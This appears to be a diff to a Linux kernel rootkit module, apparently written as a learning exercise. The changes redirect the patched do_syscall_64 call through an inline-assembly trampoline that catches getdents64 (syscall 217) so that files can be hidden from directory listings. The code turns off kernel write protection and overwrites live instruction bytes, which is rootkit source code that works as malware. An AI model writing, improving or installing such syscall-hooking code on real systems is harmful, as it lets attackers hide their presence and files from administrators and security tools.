@@ -40,6 +40,7 @@ static char *find_do_syscall_64(char *lstar_addr);
 
 void g7_syscall_64(unsigned long, struct pt_regs *);
 void (*do_syscall_64)(unsigned long, struct pt_regs *);
+void check_getdents64(void);
 static char *syscall_64_ptr;
 static unsigned long oldOff;
 
@@ -54,11 +55,14 @@ hide_files_lstar(void)
 
     //Calculate new call offset to our function
     //newOff = g7_syscall_64_addr - nextOpcodeAddr
-    unsigned long newOff = (unsigned long)g7_syscall_64 - ((unsigned long)syscall_64_ptr + 5);
+    unsigned long newOff = (unsigned long)check_getdents64 - ((unsigned long)syscall_64_ptr + 5);
 
     disable_protection();
+    memcpy((void *)check_getdents64, "\x90\x90\x90\x90\x90", 5);
     memcpy((syscall_64_ptr + 1), &newOff, 4);
     enable_protection();
+
+    hexdump((char *)check_getdents64, 32);
 }
 
 void
@@ -67,11 +71,12 @@ unhide_files_lstar(void)
     disable_protection();
     memcpy((syscall_64_ptr + 1), &oldOff, 4);
     enable_protection();
-    while (atomic_read(&syscall64_count) > 0)
-        msleep(250);
+    if (atomic_read(&syscall64_count) > 0)
+        msleep(10000);
 }
 
 //Only use with multiples of 16..
+//Best friend for this exercise, alongside https://defuse.ca/online-x86-assembler.htm
 static void
 hexdump(char *addr, int n)
 {
@@ -136,6 +141,17 @@ find_do_syscall_64(char *lstar_addr)
 }
 
 void
+check_getdents64(void)
+{
+    __asm__ volatile (
+        "\tcmp $217, %%rdi\n"
+        "\tje g7_syscall_64\n"
+        "\tjmp *%0\n"
+        :: "r"(do_syscall_64)
+    );
+}
+
+void
 g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
 {
     atomic_inc(&syscall64_count);
@@ -143,6 +159,7 @@ g7_syscall_64(unsigned long nr, struct pt_regs *pt_regs)
 
 
     if (nr == __NR_getdents64) {
+        DEBUG_INFO("We are here!\n");
         //  
         //  ( ͡°Ĺ̯ ͡° )
         //
